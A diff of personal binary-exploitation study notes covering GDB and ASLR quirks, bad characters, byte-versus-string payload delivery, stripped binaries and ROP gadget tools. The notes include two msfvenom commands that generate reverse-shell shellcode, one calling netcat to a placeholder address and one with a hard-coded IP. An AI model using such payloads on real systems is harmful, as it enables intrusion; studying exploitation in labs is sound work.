@@ -2,6 +2,8 @@ Notes:
 
 - GDB automaticlly turns off ASLR
 	- We can re-enable it if need be
+
+- GDB can also stop your payload from fully working. It will attempt to follow the new thread but will normally fail. Once you have a POC try and run it outside GDB before thinking there is an issue. 
 	
 - To configure ASLR system wide: 
 	- Update: /proc/sys/kernel/randomize_va_space
@@ -28,6 +30,7 @@ Notes:
 	- Lots of testing is required.
 	- Sample commands:
 		- # sudo msfvenom -p linux/x64/exec CMD="nc -c /bin/sh <ip> 4444" --format python  -v SC --bad-chars "\x0a"
+		- # msfvenom -p linux/x64/shell_reverse_tcp LHOST=161.35.228.161 LPORT=4444 --format python  -v SC --bad-chars "\x0A\x00\xaf\x22
 
 - Depending on how you are sending the payload it is super important to send it as bytes vs a string or other. 
 	- See which works for each case. 
@@ -49,6 +52,8 @@ Notes:
 - When source code is compiled it can be stripped
 	- This means no debugging information when reverse engineering.
 	- This means you will not even know where main() is. Makes looking for the overflow harder. 
+
+- Ropper is a good tool to look for ROP Gadgets
 
 - Tools:
 	- https://github.com/pwndbg/pwndbg
